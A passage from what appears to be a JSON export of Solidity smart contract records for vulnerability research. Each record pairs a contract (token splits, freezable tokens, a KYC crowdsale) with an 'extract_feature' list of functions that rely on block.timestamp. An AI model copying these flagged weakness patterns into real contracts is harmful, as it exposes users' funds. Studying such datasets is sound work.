require(n > 0);\n for (i = 0; i < n; i++) {\n Group storage currentGroup = groups[i];\n currentGroup.ratio = currentGroup.ratio.mul(splitFactor);\n }\n emit SplitTokens(splitFactor);\n return true;\n }\n function reverseSplitTokensBeforeDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n uint256 n = allMembers.length;\n uint256 ownerBalance = balances[msg.sender];\n uint256 decreaseSupplyBy = ownerBalance.sub(ownerBalance.div(splitFactor));\n totalSupply_ = totalSupply_.div(splitFactor);\n balances[msg.sender] = ownerBalance.div(splitFactor);\n emit Transfer(msg.sender, address(0), decreaseSupplyBy);\n for (uint256 i = 0; i < n; i++) {\n Member storage currentMember = members[allMembers[i]];\n currentMember.transferred = currentMember.transferred / int(splitFactor);\n for (uint256 j = 0; j < nextGroupNumber; j++) {\n uint256 memberBalance = currentMember.tokenBalance[j];\n uint256 divier = memberBalance.div(splitFactor);\n currentMember.tokenBalance[j] = divier;\n }\n }\n n = nextGroupNumber;\n require(n > 0);\n for (i = 0; i < n; i++) {\n Group storage currentGroup = groups[i];\n currentGroup.ratio = currentGroup.ratio.div(splitFactor);\n }\n emit ReverseSplitTokens(splitFactor);\n return true;\n }\n function splitTokensAfterDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n splitTokensBeforeDistribution(splitFactor);\n uint256 n = allMembers.length;\n for (uint256 i = 0; i < n; i++) {\n address currentMember = allMembers[i];\n uint256 memberBalance = balances[currentMember];\n if (memberBalance > 0) {\n uint256 multiplier1 = memberBalance.mul(splitFactor);\n uint256 increaseMemberSupplyBy = multiplier1.sub(memberBalance);\n balances[currentMember] = multiplier1;\n emit Transfer(address(0), currentMember, increaseMemberSupplyBy);\n }\n }\n n = allNonMembers.length;\n for (i = 0; i < n; i++) {\n address currentNonMember = allNonMembers[i];\n if (members[currentNonMember].exists) {\n continue;\n }\n uint256 nonMemberBalance = balances[currentNonMember];\n if (nonMemberBalance > 0) {\n uint256 multiplier2 = nonMemberBalance.mul(splitFactor);\n uint256 increaseNonMemberSupplyBy = multiplier2.sub(nonMemberBalance);\n balances[currentNonMember] = multiplier2;\n emit Transfer(address(0), currentNonMember, increaseNonMemberSupplyBy);\n }\n }\n emit SplitTokens(splitFactor);\n return true;\n }\n function reverseSplitTokensAfterDistribution(uint256 splitFactor) public onlyOwner returns (bool success) {\n reverseSplitTokensBeforeDistribution(splitFactor);\n uint256 n = allMembers.length;\n for (uint256 i = 0; i < n; i++) {\n address currentMember = allMembers[i];\n uint256 memberBalance = balances[currentMember];\n if (memberBalance > 0) {\n uint256 divier1 = memberBalance.div(splitFactor);\n uint256 decreaseMemberSupplyBy = memberBalance.sub(divier1);\n balances[currentMember] = divier1;\n emit Transfer(currentMember, address(0), decreaseMemberSupplyBy);\n }\n }\n n = allNonMembers.length;\n for (i = 0; i < n; i++) {\n address currentNonMember = allNonMembers[i];\n if (members[currentNonMember].exists) {\n continue;\n }\n uint256 nonMemberBalance = balances[currentNonMember];\n if (nonMemberBalance > 0) {\n uint256 divier2 = nonMemberBalance.div(splitFactor);\n uint256 decreaseNonMemberSupplyBy = nonMemberBalance.sub(divier2);\n balances[currentNonMember] = divier2;\n emit Transfer(currentNonMember, address(0), decreaseNonMemberSupplyBy);\n }\n }\n emit ReverseSplitTokens(splitFactor);\n return true;\n }\n function changeMaxContribution(address memberAddress, uint256 newMax1) public onlyOwner {\n Member storage theMember = members[memberAddress];\n require(theMember.exists);\n theMember.max1 = newMax1;\n }\n function transfer(address _to, uint256 _value) public onlyPayloadSize(2 * 32) canTransfer returns (bool success) {\n Member storage fromMember = members[msg.sender];\n if (fromMember.exists) {\n int256 transferValue = fromMember.transferred + int(_value);\n require(transferValue >= fromMember.transferred);\n require(transferValue <= int(getUnlockedBalanceLimit(msg.sender)));\n fromMember.transferred = transferValue;\n }\n if (!fromMember.exists && msg.sender != owner) {\n bool fromTransferee = nonMemberTransfers[msg.sender];\n if (!fromTransferee) {\n nonMemberTransfers[msg.sender] = true;\n allNonMembers.push(msg.sender);\n }\n }\n if (!members[_to].exists && _to != owner) {\n bool toTransferee = nonMemberTransfers[_to];\n if (!toTransferee) {\n nonMemberTransfers[_to] = true;\n allNonMembers.push(_to);\n }\n } else if (members[_to].exists) {\n int256 transferInValue = members[_to].transferred - int(_value);\n require(transferInValue <= members[_to].transferred);\n members[_to].transferred = transferInValue;\n }\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public onlyPayloadSize(3 * 32) canTransfer returns (bool success) {\n Member storage fromMember = members[_from];\n if (fromMember.exists) {\n int256 transferValue = fromMember.transferred + int(_value);\n require(transferValue >= fromMember.transferred);\n require(transferValue <= int(getUnlockedBalanceLimit(msg.sender)));\n fromMember.transferred = transferValue;\n }\n if (!fromMember.exists && _from != owner) {\n bool fromTransferee = nonMemberTransfers[_from];\n if (!fromTransferee) {\n nonMemberTransfers[_from] = true;\n allNonMembers.push(_from);\n }\n }\n if (!members[_to].exists && _to != owner) {\n bool toTransferee = nonMemberTransfers[_to];\n if (!toTransferee) {\n nonMemberTransfers[_to] = true;\n allNonMembers.push(_to);\n }\n } else if (members[_to].exists) {\n int256 transferInValue = members[_to].transferred - int(_value);\n require(transferInValue <= members[_to].transferred);\n members[_to].transferred = transferInValue;\n }\n return super.transferFrom(_from, _to, _value);\n }\n function setOpenGroup(uint256 groupNumber) public onlyOwner returns (bool success) {\n require(groupNumber < nextGroupNumber);\n openGroupNumber = groupNumber;\n return true;\n }\n function getUndistributedBalanceOf(address walletAddress, uint256 groupNumber) public view returns (uint256 balance) {\n Member storage theMember = members[walletAddress];\n require(theMember.exists);\n if (groups[groupNumber].distributed)\n return 0;\n return theMember.tokenBalance[groupNumber];\n }\n function checkMyUndistributedBalance(uint256 groupNumber) public view returns (uint256 balance) {\n return getUndistributedBalanceOf(msg.sender, groupNumber);\n }\n function transferRecovery(address _from, address _to, uint256 _value) public onlyOwner returns (bool success) {\n allowed[_from][msg.sender] = allowed[_from][msg.sender].add(_value);\n Member storage fromMember = members[_from];\n if (fromMember.exists) {\n int256 oldTransferred = fromMember.transferred;\n fromMember.transferred -= int(_value);\n require(oldTransferred >= fromMember.transferred);\n }\n return transferFrom(_from, _to, _value);\n }\n}",
  "extract_feature": [
    "function purchase() public canPurchase payable{\nrequire(msg.sender != address(0));\nMember storage memberRecord = members[msg.sender];\nGroup storage openGroup = groups[openGroupNumber];\nrequire(openGroup.ratio > 0);\nrequire(memberRecord.exists && memberRecord.groupMemberships[openGroup.groupNumber] && !openGroup.distributing && !openGroup.distributed && !openGroup.unlocked);\nuint256 currentTimestamp = block.timestamp;\nrequire(currentTimestamp >= openGroup.startTime && currentTimestamp <= openGroup.deadline);\nrequire(tx.gasprice <= maxGasPrice);\nuint256 weiAmount = msg.value;\nrequire(weiAmount >= 0.1 ether);\nuint256 ethTotal = openGroup.ethTotal.add(weiAmount);\nrequire(ethTotal <= openGroup.cap);\nuint256 userETHTotal = memberRecord.ethBalance[openGroup.groupNumber].add(weiAmount);\nif(currentTimestamp <= openGroup.phase1endTime){\nrequire(userETHTotal <= memberRecord.max1);\n} else if (currentTimestamp <= openGroup.phase2endTime) {\nrequire(userETHTotal <= openGroup.max2);\n} else {\nrequire(userETHTotal <= openGroup.max3);\n}\nuint256 tokenAmount = weiAmount.mul(openGroup.ratio);\nuint256 newLeftOver = balances[owner].sub(tokenAmount);\nopenGroup.ethTotal = ethTotal;\nmemberRecord.ethBalance[openGroup.groupNumber] = userETHTotal;\nmemberRecord.tokenBalance[openGroup.groupNumber] = memberRecord.tokenBalance[openGroup.groupNumber].add(tokenAmount);\nbalances[owner] = newLeftOver;\nowner.transfer(weiAmount);\nemit PurchaseSuccess(msg.sender,weiAmount,memberRecord.ethBalance[openGroup.groupNumber],memberRecord.tokenBalance[openGroup.groupNumber]);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f1b"
  },
  "filename": "6596.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Transfer(msg.sender, _to, _amount);\n emit Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n emit Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract ERC223Receiver {\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\ncontract ERC223Basic is ERC20Basic {\n function transfer(address to, uint value, bytes data) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n}\ncontract SuccessfulERC223Receiver is ERC223Receiver {\n event Invoked(address from, uint value, bytes data);\n function tokenFallback(address _from, uint _value, bytes _data) public {\n emit Invoked(_from, _value, _data);\n }\n}\ncontract FailingERC223Receiver is ERC223Receiver {\n function tokenFallback(address, uint, bytes) public {\n revert();\n }\n}\ncontract ERC223ReceiverWithoutTokenFallback {\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Mint(_to, _amount);\n emit Freezed(_to, _until, _amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 2;\n uint8 constant TOKEN_DECIMALS_UINT8 = 2;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"criptium\";\n string constant TOKEN_SYMBOL = \"CRIP\";\n bool constant PAUSED = false;\n address constant TARGET_USER = 0x26a8cA94E953500e03218A3289a533A6484a77b7;\n bool constant CONTINUE_MINTING = true;\n}\ncontract ERC223Token is ERC223Basic, BasicToken, FailingERC223Receiver {\n using SafeMath for uint;\n function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength > 0) {\n ERC223Receiver receiver = ERC223Receiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n emit Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n bytes memory empty;\n return transfer(_to, _value, empty);\n }\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n event Initialized();\n bool public initialized = false;\n function MainToken() public {\n init();\n transferOwnership(TARGET_USER);\n }\n function init() private {\n require(!initialized);\n initialized = true;\n if (PAUSED) {\n pause();\n }\n if (!CONTINUE_MINTING) {\n finishMinting();\n }\n emit Initialized();\n }\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nemit Released(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f1c"
  },
  "filename": "6604.sol",
  "content": "pragma solidity 0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public {\n require(_openingTime >= block.timestamp);\n require(_closingTime >= _openingTime);\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhileOpen {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract FinalizableCrowdsale is TimedCrowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasClosed());\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract MintedCrowdsale is Crowdsale {\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n require(MintableToken(token).mint(_beneficiary, _tokenAmount));\n }\n}\ncontract PostKYCCrowdsale is Crowdsale, Ownable {\n struct Investment {\n bool isVerified;\n uint totalWeiInvested;\n uint pendingTokenAmount;\n }\n uint public pendingWeiAmount = 0;\n mapping(address => Investment) public investments;\n event InvestorVerified(address investor);\n event TokensDelivered(address investor, uint amount);\n event InvestmentWithdrawn(address investor, uint value);\n function verifyInvestors(address[] _investors) public onlyOwner {\n for (uint i = 0; i < _investors.length; ++i) {\n address investor = _investors[i];\n Investment storage investment = investments[investor];\n if (!investment.isVerified) {\n investment.isVerified = true;\n emit InvestorVerified(investor);\n uint pendingTokenAmount = investment.pendingTokenAmount;\n if (pendingTokenAmount > 0) {\n investment.pendingTokenAmount = 0;\n _forwardFunds(investment.totalWeiInvested);\n _deliverTokens(investor, pendingTokenAmount);\n emit TokensDelivered(investor, pendingTokenAmount);\n }\n }\n }\n }\n function withdrawInvestment() public {\n Investment storage investment = investments[msg.sender];\n require(!investment.isVerified);\n uint totalWeiInvested = investment.totalWeiInvested;\n require(totalWeiInvested > 0);\n investment.totalWeiInvested = 0;\n investment.pendingTokenAmount = 0;\n pendingWeiAmount = pendingWeiAmount.sub(totalWeiInvested);\n msg.sender.transfer(totalWeiInvested);\n emit InvestmentWithdrawn(msg.sender, totalWeiInvested);\n assert(pendingWeiAmount <= address(this).balance);\n }\n function _preValidatePurchase(address _beneficiary, uint _weiAmount) internal {\n require(_beneficiary == msg.sender);\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n function _processPurchase(address, uint _tokenAmount) internal {\n Investment storage investment = investments[msg.sender];\n investment.totalWeiInvested = investment.totalWeiInvested.add(msg.value);\n if (investment.isVerified) {\n _deliverTokens(msg.sender, _tokenAmount);\n emit TokensDelivered(msg.sender, _tokenAmount);\n } else {\n investment.pendingTokenAmount = investment.pendingTokenAmount.add(_tokenAmount);\n pendingWeiAmount = pendingWeiAmount.add(msg.value);\n }\n }\n function _forwardFunds() internal {\n if (investments[msg.sender].isVerified) {\n super._forwardFunds();\n }\n }\n function _forwardFunds(uint _weiAmount) internal {\n pendingWeiAmount = pendingWeiAmount.sub(_weiAmount);\n wallet.transfer(_weiAmount);\n }\n function _postValidatePurchase(address, uint _weiAmount) internal {\n super._postValidatePurchase(msg.sender, _weiAmount);\n assert(pendingWeiAmount <= address(this).balance);\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract CappedToken is MintableToken {\n uint256 public cap;\n function CappedToken(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n require(totalSupply_.add(_amount) <= cap);\n return super.mint(_to, _amount);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract PausableToken is StandardToken, Pausable {\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, 